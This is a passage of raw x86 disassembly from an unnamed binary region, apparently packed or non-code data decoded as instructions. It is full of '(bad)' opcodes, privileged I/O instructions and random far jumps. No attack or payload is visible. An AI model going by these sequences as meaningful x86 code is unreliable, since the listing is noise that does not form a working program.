  4183f9:	or     DWORD PTR [esp+esi*2-0x15096c37],edi
  418400:	(bad)  
  418401:	js     0x418481
  418403:	es jmp 0x99c3:0xaa434302
  41840b:	jbe    0x41838d
  41840d:	and    DWORD PTR [edi+0x768baddd],0x34
  418414:	popf   
  418415:	call   0xe841fc3d
  41841a:	and    BYTE PTR [ebp-0x469464f8],dh
  418420:	stos   DWORD PTR es:[edi],eax
  418421:	adc    al,0x61
  418423:	mov    ah,0xd1
  418425:	bound  esp,QWORD PTR ds:0xb7d3
  41842a:	sub    al,0xd8
  41842c:	adc    cl,BYTE PTR [edx+0x8]
  41842f:	push   es
  418430:	push   ebx
  418431:	dec    edi
  418432:	sbb    ebp,ebp
  418434:	arpl   bx,sp
  418436:	pop    edi
  418437:	push   edi
  418438:	dec    eax
  418439:	or     ch,BYTE PTR [eax+0x2dc65f8c]
  41843f:	lea    ecx,[edx+0x484c8524]
  418445:	int3   
  418446:	dec    DWORD PTR [edx-0x3f]
  418449:	jo     0x4183ff
  41844b:	fnstenv [esi]
  41844d:	mov    fs,ebx
  41844f:	xchg   esp,eax
  418450:	(bad)
  418453:	fdivr  DWORD PTR [ecx]
  418455:	xchg   BYTE PTR [edi-0x50],dl
  418458:	xchg   ecx,eax
  418459:	add    dl,BYTE PTR [ebp+ecx*8-0x2]
  41845d:	fistp  QWORD PTR [esi+0x2e]
  418460:	out    0xd8,al
  418462:	aam    0x37
  418464:	pop    ecx
  418465:	sub    BYTE PTR [edi-0x5b31c95b],bh
  41846b:	fwait
  41846c:	les    esi,FWORD PTR [ebx+0x3e99f1f2]
  418472:	cmp    ax,0xf3bb
  418476:	(bad)
  418479:	scas   al,BYTE PTR es:[edi]
  41847a:	mov    ecx,0xf2bc7dc1
  41847f:	leave  
  418480:	jo     0x41849c
  418482:	fwait
  418483:	or     eax,0x67f97769
  418488:	js     0x418426
  41848a:	push   ebp
  41848b:	or     ah,dh
  41848d:	test   BYTE PTR [eax],dh
  41848f:	push   edi
  418490:	mov    cl,0x61
  418492:	js     0x418431
  418494:	scas   al,BYTE PTR es:[edi]
  418495:	add    dh,ah
  418497:	sahf   
  418498:	jmp    0x4aeef962
  41849d:	sbb    dh,BYTE PTR [edi-0x1016d9a6]
  4184a3:	ror    DWORD PTR [ecx-0x7152bc86],cl
  4184a9:	lahf   
  4184aa:	idiv   DWORD PTR [esi+0x0]
  4184ad:	test   BYTE PTR [bp+di-0x55],0x96
  4184b2:	hlt    
  4184b3:	jle    0x418487
  4184b5:	cmp    eax,0xcc888322
  4184ba:	or     BYTE PTR [ebx-0x49],bl
  4184bd:	jo     0x418537
  4184bf:	or     ebx,DWORD PTR [edx+0x76]
  4184c2:	adc    al,0xcb
  4184c4:	retf   0xc59a
  4184c7:	dec    esi
  4184c8:	iret   
  4184c9:	lods   al,BYTE PTR ds:[esi]
  4184ca:	mov    ebp,0xb23cbe00
  4184cf:	push   ss
  4184d0:	or     ecx,DWORD PTR [ecx+esi*4+0x7a421658]
  4184d7:	mov    cs,eax
  4184d9:	mov    ecx,0xfccc7700
  4184de:	out    dx,al
  4184df:	fwait
  4184e0:	ss mov edi,0xe28f80b
  4184e6:	call   0x2cc9b4d8
  4184eb:	dec    ebp
  4184ec:	ror    BYTE PTR [eax-0x1133350a],cl
  4184f2:	es leave 
  4184f4:	sbb    ah,BYTE PTR [ebp+0x7924ed70]
  4184fa:	das    
  4184fb:	pop    esp
  4184fc:	retf   0x3a54
  4184ff:	(bad)  
  418500:	pop    esp
  418501:	pop    ss
  418502:	stos   DWORD PTR es:[edi],eax
  418503:	je     0x41857b
  418505:	and    eax,DWORD PTR [ebx-0x2ead3009]
  41850b:	inc    ecx
  41850c:	sbb    eax,0x81859251
  418511:	adc    dh,BYTE PTR [edi]
  418513:	jae    0x418528
  418515:	cmp    DWORD PTR [esi+0x609eae2],edi
  41851b:	cmp    ah,BYTE PTR [edi-0x17c7eca4]
  418521:	mov    ds:0x1294683,al
  418526:	inc    eax
  418527:	dec    eax
  418528:	dec    esi
  418529:	ror    BYTE PTR [edi],cl
  41852b:	stc    
  41852c:	push   es
  41852d:	retf   
  41852e:	clc    
  41852f:	das    
  418530:	ret    0x3479
  418533:	pop    ds
  418534:	push   es
  418535:	pop    ss
  418536:	(bad)  
  418538:	jmp    0x418535
  41853a:	(bad)  
  41853c:	adc    ebp,DWORD PTR [ecx+0xe]
  41853f:	push   cs
  418540:	adc    dh,BYTE PTR [esi]
  418542:	and    al,0xa7
  418544:	xchg   BYTE PTR [ebp+0x2722ddf6],ch
  41854a:	and    bl,BYTE PTR [ecx-0xacfbc36]
  418550:	sbb    bh,BYTE PTR [edi]
  418552:	ins    BYTE PTR es:[edi],dx
  418553:	inc    ebx
  418554:	scas   eax,DWORD PTR es:[edi]
  418555:	sbb    BYTE PTR [ecx],ah
  418557:	inc    ebx
  418558:	adc    al,0x1a
  41855a:	pop    edx
  41855b:	and    eax,DWORD PTR ds:0x6abee5ed
  418561:	push   0x16
  418563:	loop   0x4184f9
  418565:	sbb    ah,BYTE PTR [edi+0x7bb8735b]
  41856b:	cld    
  41856c:	cs sub al,0xab
  41856f:	cmp    ecx,DWORD PTR [edx+ebx*1-0x76caff9a]
  418576:	mov    al,ds:0x61a4970b
  41857b:	push   0xffffff9b
  41857d:	fadd   DWORD PTR [esi+0x24]
  418580:	push   eax
  418581:	(bad)  
  418582:	popa   
  418583:	pop    ss
  418584:	mov    ch,0xf4
  418586:	and    dh,BYTE PTR [esi]
  418588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418589:	lahf   
  41858a:	adc    BYTE PTR [eax],cl
  41858c:	stc    
  41858d:	cdq    
  41858e:	pop    eax
  41858f:	and    DWORD PTR [esp+ebp*2+0x64],ebx
  418593:	cmp    eax,0xe49d0ead
  418598:	mov    eax,ds:0xe43e1342
  41859d:	and    dh,bl
  41859f:	xchg   esp,eax
  4185a0:	ret    0x9317
  4185a3:	add    DWORD PTR [ebx],ebx
  4185a5:	push   0x57a3bc63
  4185aa:	sub    al,0x7c
  4185ac:	addr16 mov ds:0x5865,eax
  4185b0:	inc    esp
  4185b1:	sub    ebx,ecx
  4185b3:	out    0x94,eax
  4185b5:	hlt    
  4185b6:	inc    edi
  4185b7:	loopne 0x41858b
  4185b9:	cmp    al,0x8d
  4185bb:	and    al,0xd4
  4185bd:	mov    bh,0xee
  4185bf:	cmp    edi,DWORD PTR [ecx-0x4]
  4185c2:	rcl    DWORD PTR [ebx],cl
  4185c4:	imul   edx,DWORD PTR [edx+0x7e7d5151],0x42c35364
  4185ce:	pusha  
  4185cf:	fwait
  4185d0:	sub    eax,0x66d03718
  4185d5:	sbb    edi,DWORD PTR [edi+0x7337f769]
  4185db:	cli    
  4185dc:	stc    
  4185dd:	sbb    BYTE PTR [esi+eax*2],dh
  4185e0:	jbe    0x418578
  4185e2:	dec    eax
  4185e3:	inc    esi
  4185e4:	inc    cx
  4185e6:	cdq    
  4185e7:	pop    ebx
  4185e8:	fs dec ebp
  4185ea:	inc    ebx
  4185eb:	scas   eax,DWORD PTR es:[edi]
  4185ec:	fistp  WORD PTR [edx+0x23]
  4185ef:	sub    DWORD PTR [ebp-0x658656d7],edi
  4185f5:	sti    
  4185f6:	enter  0x5027,0x30
  4185fa:	cmp    eax,0x9f8afa5b
  4185ff:	popf   
  418600:	call   0x6549:0xbe3801b9
  418607:	fwait
  418608:	cwde   
  418609:	and    DWORD PTR [ebx-0x3284416],edx
  41860f:	mov    edx,0xa00668bd
  418614:	pop    ecx
  418615:	ret    
  418616:	sbb    eax,0x4dfa8990
  41861b:	add    eax,0x5085641
  418620:	mov    ch,0x7
  418622:	ds or  al,0x61
  418625:	test   BYTE PTR [ebp+0x63],0x62
  418629:	dec    ebx
  41862a:	xchg   DWORD PTR [esi+0x7d],eax
  41862d:	retf   
  41862e:	imul   ecx,DWORD PTR [edi],0x54
  418631:	mov    esp,0xc198c173
  418636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418637:	ficom  WORD PTR [bx+si-0xf9]
  41863c:	mov    ecx,0xe84522af
  418641:	push   0x72
  418643:	cmp    eax,0x19740bcf
  418648:	adc    al,0xcc
  41864a:	test   eax,0x50e013af
  41864f:	(bad)  
  418650:	pop    edi
  418651:	inc    esp
  418652:	and    BYTE PTR ds:0x6031ce76,0xda
  418659:	sbb    ecx,DWORD PTR [edi]
  41865b:	cld    
  41865c:	cmp    ch,bh
  41865e:	imul   eax,DWORD PTR [edi-0x49],0xbbfabd18
  418665:	pop    ebx
  418666:	or     eax,eax
  418668:	jbe    0x418603
  41866a:	in     eax,0xe8
  41866c:	ret    0xb5d0
  41866f:	add    edx,DWORD PTR [ecx+0x28e2d7db]
  418675:	test   ebx,0x991cd36f
  41867b:	dec    esp
  41867c:	sub    eax,0x57dca1ef
  418681:	push   ebp
  418682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418683:	mov    eax,ds:0xeaf0a21a
  418688:	xchg   edx,eax
  418689:	push   ecx
  41868a:	pop    ebp
  41868b:	shr    DWORD PTR [ebx-0x1342e207],cl
  418691:	xor    DWORD PTR [ebx-0xa],edx
  418694:	push   eax
  418695:	push   edi
  418696:	outs   dx,DWORD PTR ds:[esi]
  418697:	sar    eax,0xaf
  41869a:	pmuludq mm7,QWORD PTR [edx]
  41869d:	inc    edx
  41869e:	int    0x6c
  4186a0:	sub    DWORD PTR [esi+0x72],edx
  4186a3:	push   edi
  4186a4:	mov    edx,0xd0ce1ad8
  4186a9:	dec    edx
  4186aa:	and    ebx,ebx
  4186ac:	call   0x890a:0xa0ce09b7
  4186b3:	ins    BYTE PTR es:[edi],dx
  4186b4:	jo     0x418669
  4186b6:	mov    WORD PTR [esi],cs
  4186b8:	mov    al,0x33
  4186ba:	and    BYTE PTR [esi-0x671b038b],0x77
  4186c1:	daa    
  4186c2:	es mov bh,0xe
  4186c5:	mov    ds:0xd2bd4617,eax
  4186ca:	xchg   esi,eax
  4186cb:	repz mov edi,gs
  4186ce:	mov    ebx,0x50017d59
  4186d3:	iret   
  4186d4:	inc    edi
  4186d5:	inc    ecx
  4186d6:	fisubr WORD PTR [eax]
  4186d8:	out    dx,eax
  4186d9:	dec    esi
  4186da:	inc    ebx
  4186db:	dec    edx
  4186dc:	cs mov dh,0x7e
  4186df:	cdq    
  4186e0:	mov    ebx,0xd6e02e7a
  4186e5:	push   ebx
  4186e6:	fcomi  st,st(3)
  4186e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186e9:	mov    al,0x33
  4186eb:	in     al,dx
  4186ec:	jno    0x4186c6
  4186ee:	(bad)  
  4186ef:	mov    ah,bl
  4186f1:	repnz inc esp
  4186f3:	arpl   WORD PTR [eax+0x74ab38ea],sp
  4186f9:	pop    ebp
  4186fa:	inc    edi
  4186fb:	or     DWORD PTR [edi-0x1fdc8b0c],esi
  418701:	clc    
  418702:	mov    ebx,0x64725c7c
  418707:	inc    ebp
  418708:	ficom  DWORD PTR [esi+0x2f6c2e79]
  41870e:	push   eax
  41870f:	xor    esp,ebp
  418711:	dec    eax
  418712:	aad    0x41
  418714:	add    ch,BYTE PTR [ecx+0x3d]
  418717:	cmp    al,0x2f
  418719:	cs jmp 0xc180:0xd8775a9d
  418721:	add    esp,ecx
  418723:	mov    al,ds:0x49fad84a
  418728:	mov    ds:0x808aec9d,al
  41872d:	xor    eax,DWORD PTR [ebp+eiz*4+0x18290e16]
  418734:	lods   al,BYTE PTR ds:[esi]
  418735:	sub    BYTE PTR [edi+0x5a2e5d4],dh
  41873b:	sbb    DWORD PTR [ebx],esp
  41873d:	(bad)  
  41873e:	mov    esp,0x6c3a765c
  418743:	push   ds
  418744:	jo     0x41871f
  418746:	sbb    DWORD PTR [eax-0x6a],0xd8058eda
  41874d:	out    0x45,al
  41874f:	pusha  
  418750:	push   edx
  418751:	ss das 
  418753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418754:	pop    edx
  418755:	into   
  418756:	fwait
  418757:	sbb    ecx,DWORD PTR [ebx+0x44]
  41875a:	loop   0x418721
  41875c:	mov    al,0xb0
  41875e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41875f:	in     al,dx
  418760:	pusha  
  418761:	add    al,0xe4
  418763:	imul   ecx,ebp,0x53a82a2c
  418769:	test   eax,0xb38b36cc
  41876e:	sbb    al,0x3e
  418770:	jae    0x41873d
  418772:	jo     0x4187a9
  418774:	sbb    al,0x8c
  418776:	in     eax,0x7
  418778:	xor    eax,0xa5290508
  41877d:	mov    ds:0x1f5fb419,al
  418782:	mov    ah,0xcf
  418784:	jbe    0x41871f
  418786:	ja     0x4187eb
  418788:	fild   DWORD PTR [ebx-0x7f]
  41878b:	fs je  0x418773
  41878e:	sub    BYTE PTR [eax],dl
  418790:	(bad)  
  418792:	aaa    
  418793:	mov    ebx,0x593e0c2c
  418798:	in     al,0x12
  41879a:	sbb    bl,BYTE PTR [ebx]
  41879c:	xor    eax,0x286bad80
  4187a1:	ss stc 
  4187a3:	mov    ds:0x2ab8aa03,al
  4187a8:	call   0xc53d:0xb45c10cc
  4187af:	stos   BYTE PTR es:[edi],al
  4187b0:	and    eax,0xd1d63331
  4187b5:	mov    DWORD PTR [eax+0x571196d6],ebp
  4187bb:	sbb    al,0xa2
  4187bd:	xchg   ecx,ebp
  4187bf:	(bad)  
  4187c0:	sub    DWORD PTR [eax+0x7a0b1085],esi
  4187c6:	xor    esi,DWORD PTR [edi]
  4187c8:	pop    ebp
  4187c9:	sub    eax,0x6ba1beb8
  4187ce:	retf   0xc518
  4187d1:	ror    ebx,0x8d
  4187d4:	or     eax,DWORD PTR [ebx]
  4187d6:	push   0xffffff98
  4187d8:	repnz xchg ebx,eax
  4187da:	pushf  
  4187db:	enter  0xda97,0x63
  4187df:	retf   
  4187e0:	sbb    eax,0xcf9f2885
  4187e5:	jecxz  0x4187f2
  4187e7:	shl    ecx,cl
  4187e9:	hlt    
  4187ea:	out    dx,al
  4187eb:	adc    ch,BYTE PTR [edi+0x4d]
  4187ee:	je     0x41885d
  4187f0:	not    BYTE PTR [ebx]
  4187f2:	dec    edx
  4187f3:	or     al,BYTE PTR [esi-0x75ba61d2]
  4187f9:	mov    ebx,0x8c5b51
  4187fe:	bound  esi,QWORD PTR [esi-0x10622685]
  418804:	imul   ecx,DWORD PTR [ebx-0x12d77e2b],0xb7c8b2f1
  41880e:	sar    esi,1
  418810:	dec    ebx
  418811:	jge    0x41884d
  418813:	push   es
  418814:	retf   
  418815:	pushf  
  418816:	fsubr  st,st(5)
  418818:	inc    edx
  418819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41881a:	fs in  al,dx
  41881c:	fidiv  WORD PTR [eax-0x23]
  41881f:	sbb    eax,0x2dfa115b
  418824:	in     eax,0xcf
  418826:	in     eax,0x51
  418828:	push   edi
  418829:	call   0x18a6:0x68bc6eb3
  418830:	stc    
  418831:	push   0xb3b5c846
  418836:	pushf  
  418837:	(bad)  
  418838:	aad    0x0
  41883a:	sub    DWORD PTR [edi+0x3c37d211],edx
  418840:	fdivr  DWORD PTR [edi]
  418842:	mov    ebp,0x1384f289
  418847:	cmp    eax,0xbccbcc1d
  41884c:	adc    DWORD PTR [edx],esp
  41884e:	stc    
  41884f:	inc    esp
  418850:	jne    0x418872
  418852:	ficom  DWORD PTR [ecx-0x599881eb]
  418858:	in     al,0xda
  41885a:	clc    
  41885b:	inc    esp
  41885c:	cli    
  41885d:	cmp    esi,DWORD PTR [edi+0x483a072d]
  418863:	push   ss
  418864:	xor    bl,BYTE PTR [edx+0x2a]
  418867:	dec    eax
  418868:	add    BYTE PTR [ecx+0x5f],0x27
  41886c:	imul   edi,DWORD PTR [eax+ebx*4-0x6f879fb3],0x6
  418874:	cmp    cl,BYTE PTR [ebx]
  418876:	ds in  al,dx
  418878:	or     al,0xac
  41887a:	jge    0x41884c
  41887c:	jecxz  0x4188c1
  41887e:	mov    dh,0xbe
  418880:	push   esp
  418881:	and    al,0x67
  418883:	mov    al,0x73
  418885:	inc    esi
  418886:	enter  0x2c5c,0xae
  41888a:	inc    esp
  41888b:	outs   dx,BYTE PTR ss:[esi]
  41888d:	add    eax,0x59dd1002
  418892:	pop    eax
  418893:	inc    edx
  418894:	sbb    BYTE PTR [eax-0x213fe43c],ch
  41889a:	dec    eax
  41889b:	add    DWORD PTR [ebp+0x7bbd8cf2],ecx
  4188a1:	push   cs
  4188a2:	and    al,BYTE PTR ds:0x6b3f5b81
  4188a8:	mov    dh,0xd9
  4188aa:	enter  0xb0f4,0xf2
  4188ae:	fcomp  DWORD PTR [edx+edi*1-0x3a]
  4188b2:	je     0x418868
  4188b4:	mov    cs,WORD PTR [edx+ebx*4-0x4b]
  4188b8:	jg     0x4188b7
  4188ba:	fst    DWORD PTR [edi]
  4188bc:	jb     0x418859
  4188be:	inc    ebx
  4188bf:	jg     0x418845
  4188c1:	push   edx
  4188c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188c3:	out    0xb6,al
  4188c5:	arpl   WORD PTR [esi+esi*4+0x2413e20a],bx
  4188cc:	out    0x75,eax
  4188ce:	pusha  
  4188cf:	cld    
  4188d0:	mov    ds:0x2e9af3c8,al
  4188d5:	aaa    
  4188d6:	pop    ss
  4188d7:	pop    eax
  4188d8:	pop    ecx
  4188d9:	mov    al,ds:0xd07b1aca
  4188de:	jp     0x4188ea
  4188e0:	inc    ecx
  4188e1:	jmp    0x418938
  4188e3:	loope  0x4188bf
  4188e5:	or     eax,0x4994cb90
  4188ea:	ds xchg esp,eax
  4188ec:	mov    esp,0x88d242c8
  4188f1:	scas   al,BYTE PTR es:[edi]
  4188f2:	out    0x2f,al
  4188f4:	rcr    DWORD PTR [ebp-0x3c1387a4],1
  4188fa:	int3   
  4188fb:	xchg   DWORD PTR [ebx-0x18],eax
  4188fe:	inc    esp
  4188ff:	push   cs
  418900:	push   es
  418901:	and    BYTE PTR [ebx-0x3bd0968d],ah
  418907:	sbb    BYTE PTR [eax],dh
  418909:	sub    esi,DWORD PTR [edx]
  41890b:	test   al,0x14
  41890d:	adc    al,0x7
  41890f:	and    DWORD PTR [ebp+0x6aa1ad99],edx
  418915:	adc    esp,DWORD PTR [edi+0x10]
  418918:	push   eax
  418919:	jns    0x4188c4
  41891b:	mov    cl,0x9b
  41891d:	jbe    0x41891e
  41891f:	push   ecx
  418920:	pop    edx
  418921:	adc    al,0xa7
  418923:	scas   eax,DWORD PTR es:[edi]
  418924:	or     BYTE PTR [ebx-0x57],al
  418927:	xchg   esi,eax
  418928:	dec    edx
  418929:	inc    edi
  41892a:	rol    BYTE PTR [edi-0x78],cl
  41892d:	cmp    BYTE PTR [edi],dh
  41892f:	stos   BYTE PTR es:[edi],al
  418930:	mov    eax,0x8b895486
  418935:	push   esi
  418936:	push   cs
  418937:	das    
  418938:	inc    edi
  418939:	das    
  41893a:	dec    ecx
  41893b:	das    
  41893c:	mov    ds:0xc34abc61,eax
  418941:	xchg   edi,eax
  418942:	lahf   
  418943:	stos   BYTE PTR es:[edi],al
  418944:	adc    eax,0xdd97a350
  418949:	les    ecx,FWORD PTR [ebp-0xa]
  41894c:	and    ah,dl
  41894e:	mov    bl,BYTE PTR [eax+0x33ed3286]
  418954:	ins    DWORD PTR es:[edi],dx
  418955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418956:	fcomip st,st(6)
  418958:	ja     0x4188e3
  41895a:	mov    bl,0x91
  41895c:	call   eax
  41895e:	cmp    BYTE PTR [ecx],cl
  418960:	pop    esi
  418961:	popa   
  418962:	outs   dx,BYTE PTR ds:[esi]
  418963:	test   eax,0x925f2867
  418968:	mov    dh,0x81
  41896a:	lock leave 
  41896c:	int    0x4
  41896e:	xchg   ebp,eax
  41896f:	in     eax,0x42
  418971:	scas   eax,DWORD PTR es:[edi]
  418972:	cmc    
  418973:	pop    esi
  418974:	inc    ecx
  418975:	cli    
  418976:	and    esp,DWORD PTR [ecx-0x5ecd7cbd]
  41897c:	imul   ebx,edi,0xa7748d2e
  418982:	(bad)
  418985:	and    al,0xb1
  418987:	arpl   WORD PTR [esi+0x7e10f5dd],si
  41898d:	icebp  
  41898e:	loop   0x41894e
  418990:	call   0x12a8:0xf08d668d
  418997:	and    al,0xd4
  418999:	pop    esi
  41899a:	add    eax,0x95dd7cab
  41899f:	test   eax,0xd0d462bb
  4189a4:	add    edi,DWORD PTR [ecx-0x47]
  4189a7:	lds    edx,FWORD PTR [ecx]
  4189a9:	mov    BYTE PTR [eax-0x178f1adb],cl
  4189af:	or     BYTE PTR [ecx+0x1086af66],bh
  4189b5:	mov    bl,0xe1
  4189b7:	xchg   ecx,eax
  4189b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189b9:	jecxz  0x418a2d
  4189bb:	(bad)  
  4189bc:	jmp    0xc50e:0x93490d5e
  4189c3:	xchg   esi,eax
  4189c4:	test   ecx,0x926a64cc
  4189ca:	or     ch,bh
  4189cc:	xor    eax,0x26640ead
  4189d1:	ret    
  4189d2:	icebp  
  4189d3:	ins    BYTE PTR es:[edi],dx
  4189d4:	fs pop esp
  4189d6:	mov    ds:0x8582a4cf,al
  4189db:	or     eax,0xa2b94799
  4189e0:	sar    DWORD PTR [ebp-0x38cd83d1],cl
  4189e6:	aad    0x84
  4189e8:	dec    ebp
  4189e9:	popf   
  4189ea:	xchg   DWORD PTR [esp+0x536fbba9],edx
  4189f1:	push   ecx
  4189f2:	nop
  4189f3:	(bad)  
  4189f4:	jbe    0x4189d3
  4189f6:	mov    ebp,0xa5f19277
  4189fb:	mov    ah,0xeb
  4189fd:	push   es
  4189fe:	fwait
  4189ff:	jae    0x418a46
  418a01:	ficomp WORD PTR [edx-0x19]
  418a04:	xor    al,0x30
  418a06:	stos   DWORD PTR es:[edi],eax
  418a07:	out    dx,eax
  418a08:	ins    DWORD PTR es:[edi],dx
  418a09:	lahf   
  418a0a:	push   ebx
  418a0b:	in     al,0xc4
  418a0d:	aam    0xc7
  418a0f:	outs   dx,BYTE PTR ds:[esi]
  418a10:	jae    0x418a4a
  418a12:	sub    eax,0x70e0819a
  418a17:	sbb    al,0x1e
  418a19:	xchg   edx,eax
  418a1a:	mov    edx,0x8b3eeb27
  418a1f:	mov    bh,0xcf
  418a21:	push   edi
  418a22:	(bad)  
  418a23:	fwait
  418a24:	mov    esp,0x86d48987
  418a29:	(bad)  [edx+edi*2]
  418a2c:	es push ds
  418a2e:	mov    bh,0x96
  418a30:	pushf  
  418a31:	dec    edi
  418a32:	add    al,0x98
  418a34:	dec    esi
  418a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a36:	out    dx,al
  418a37:	sar    esi,0x95
  418a3a:	jb     0x4189e4
  418a3c:	es je  0x418a57
  418a3f:	mov    edx,DWORD PTR [edi-0x32]
  418a42:	jne    0x418a88
  418a44:	xor    cl,al
  418a46:	adc    BYTE PTR [esi+0x2ad3f79],0x44
  418a4d:	xchg   esp,eax
  418a4e:	mov    dh,0x7e
  418a50:	dec    ebx
  418a51:	aas    
  418a52:	idiv   DWORD PTR [ebx]
  418a54:	xor    edi,DWORD PTR [ecx-0x3a]
  418a57:	mov    esi,0x6262a00b
  418a5c:	sub    BYTE PTR [ecx-0x268334b9],0xea
  418a63:	leave  
  418a64:	ins    DWORD PTR es:[edi],dx
  418a65:	sahf   
  418a66:	test   eax,0xe59e7583
  418a6b:	retf   0x14ff
  418a6e:	aam    0x95
  418a70:	jns    0x418a06
  418a72:	sahf   
  418a73:	aaa    
  418a74:	dec    esi
  418a75:	dec    ebp
  418a76:	and    al,0x8e
  418a78:	inc    edx
  418a79:	sbb    bh,BYTE PTR [ecx]
  418a7b:	test   BYTE PTR [eax],dl
  418a7d:	shl    BYTE PTR [ebp+0x52],cl
  418a80:	add    eax,0xeaebfaa6
  418a85:	dec    edx
  418a86:	(bad)
  418a89:	dec    eax
  418a8a:	xor    al,0x5
  418a8c:	and    DWORD PTR [edi],edi
  418a8e:	vmread ebx,ecx
  418a91:	cdq    
  418a92:	rcl    DWORD PTR [esi-0x20bc0bb8],1
  418a98:	jle    0x418a54
  418a9a:	mov    ch,BYTE PTR [ecx-0x49]
  418a9d:	rol    BYTE PTR [edi+eiz*1-0x1d4daaf3],0x79
  418aa5:	jge    0x418a41
  418aa7:	clc    
  418aa8:	retf   0xe552
  418aab:	(bad)  [edi]
  418aad:	loopne 0x418b2c
  418aaf:	mov    cl,0xe1
  418ab1:	mov    ebp,0x3496e42
  418ab6:	xor    DWORD PTR ds:0x675ff3c1,0xab4cf989
  418ac0:	hlt    
  418ac1:	jns    0x418b3a
  418ac3:	fs int 0x23
  418ac6:	jl     0x418a58
  418ac8:	clc    
  418ac9:	jecxz  0x418a69
  418acb:	das    
  418acc:	mov    esi,0x3562c8e2
  418ad1:	mov    edx,0xd95d8015
  418ad6:	dec    edi
  418ad7:	cld    
  418ad8:	pop    ss
  418ad9:	or     bh,0xee
  418adc:	or     al,0x77
  418ade:	mov    dl,BYTE PTR gs:[edi-0x8]
  418ae2:	pop    edx
  418ae3:	shl    DWORD PTR [eax-0x3628092b],cl
  418ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aea:	and    DWORD PTR [eax+0x4e],ecx
  418aed:	je     0x418ae3
  418aef:	pusha  
  418af0:	xchg   esi,eax
  418af1:	enter  0x361e,0x4a
  418af5:	(bad)  
  418af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418af7:	mov    ebp,0x33d4e481
  418afc:	sub    DWORD PTR [esi-0x5c7bbf43],esi
  418b02:	xchg   dl,dl
  418b04:	int3   
  418b05:	jmp    0x418ad8
  418b07:	ins    DWORD PTR es:[edi],dx
  418b08:	cmp    edi,0x4c
  418b0b:	mov    ah,0x69
  418b0d:	shl    BYTE PTR [ebx+0x2ccfef3e],cl
  418b13:	xor    edi,0xde25fff5
  418b19:	mov    bl,0xa1
  418b1b:	(bad)  
  418b1c:	stos   DWORD PTR es:[edi],eax
  418b1d:	pushf  
  418b1e:	rol    DWORD PTR [si+0x43],1
  418b22:	adc    BYTE PTR [edx+0x25],cl
  418b25:	stc    
  418b26:	pop    ebx
  418b27:	lods   eax,DWORD PTR ds:[esi]
  418b28:	add    edx,edx
  418b2a:	test   BYTE PTR [ebp+0x69377b46],dh
  418b30:	rcl    DWORD PTR [esi+0x6a],1
  418b33:	dec    esp
  418b34:	mov    cl,0x3b
  418b36:	retf   
  418b37:	jno    0x418b37
  418b39:	(bad)  
  418b3a:	es jns 0x418b57
  418b3d:	out    dx,al
  418b3e:	ins    WORD PTR es:[edi],dx
  418b40:	scas   al,BYTE PTR es:[edi]
  418b41:	pusha  
  418b42:	or     BYTE PTR [ebx-0x2bf6a34e],ah
  418b48:	cld    
  418b49:	sub    DWORD PTR [ecx],ebp
  418b4b:	rcr    ah,cl
  418b4d:	add    al,0xcc
  418b4f:	jle    0x418b8a
  418b51:	dec    ebp
  418b52:	stc    
  418b53:	mov    ebx,0x6f4dd0db
  418b58:	loop   0x418b25
  418b5a:	enter  0xb7c8,0x32
  418b5e:	sbb    al,0x8f
  418b60:	lahf   
  418b61:	mov    esp,0x371b3373
  418b66:	mov    edx,DWORD PTR [edi+eax*1+0xb]
  418b6a:	pop    ds
  418b6b:	aad    0x18
  418b6d:	outs   dx,DWORD PTR ds:[esi]
  418b6e:	mov    ds:0xa093273c,al
  418b73:	jmp    0xe2e7:0x878963f3
  418b7a:	adc    eax,0x8d1976a9
  418b7f:	repz sbb dh,dh
  418b82:	inc    esp
  418b83:	pusha  
  418b84:	xchg   ecx,eax
  418b85:	pop    esp
  418b86:	or     dh,BYTE PTR [edi+0x0]
  418b89:	add    DWORD PTR [ecx+0x756a9e4e],edi
  418b8f:	scas   al,BYTE PTR es:[edi]
  418b90:	pusha  
  418b91:	inc    ebp
  418b92:	jp     0x418bbf
  418b94:	sar    DWORD PTR [edx+0x68ef99b4],cl
  418b9a:	sub    ch,BYTE PTR [eax-0x63]
  418b9d:	fs dec esp
  418b9f:	ds push edi
  418ba1:	cli    
  418ba2:	fdivr  st,st(0)
  418ba4:	(bad)  
  418ba5:	out    dx,al
  418ba6:	mov    ds:0x3d7aed41,al
  418bab:	inc    edx
  418bac:	xor    al,BYTE PTR [edx+ecx*8]
  418baf:	sbb    BYTE PTR [eax+0x1e70bc59],al
  418bb5:	xor    DWORD PTR [eax],ebp
  418bb7:	fld    QWORD PTR [ebx]
  418bb9:	out    0x15,al
  418bbb:	push   esi
  418bbc:	inc    esi
  418bbd:	in     eax,dx
  418bbe:	bound  eax,QWORD PTR [edx+0x7d]
  418bc1:	mov    edi,0x13efa464
  418bc6:	fcomi  st,st(1)
  418bc8:	or     cl,BYTE PTR [esi]
  418bca:	retf   
  418bcb:	into   
  418bcc:	push   ss
  418bcd:	(bad)  
  418bce:	sub    DWORD PTR [ebp-0x30942b18],esi
  418bd4:	mov    ds:0x90a1509e,al
  418bd9:	in     al,dx
  418bda:	fistp  WORD PTR [ebx]
  418bdc:	push   esi
  418bdd:	sub    al,0xde
  418be0:	(bad)  
  418be1:	imul   ecx,DWORD PTR [edi+0x7d],0xffffff90
  418be5:	pusha  
  418be6:	sbb    BYTE PTR [esi+0x4ee0df8a],bl
  418bec:	xor    BYTE PTR [esi-0x37d8b9d3],0xc6
  418bf3:	les    eax,FWORD PTR [ebp+edx*1+0x4097163a]
  418bfa:	loop   0x418c02
  418bfc:	sti    
  418bfd:	jg     0x418c30
  418bff:	maxps  xmm2,xmm2
  418c02:	shr    BYTE PTR [eax-0x69],1
  418c05:	xor    al,0x4c
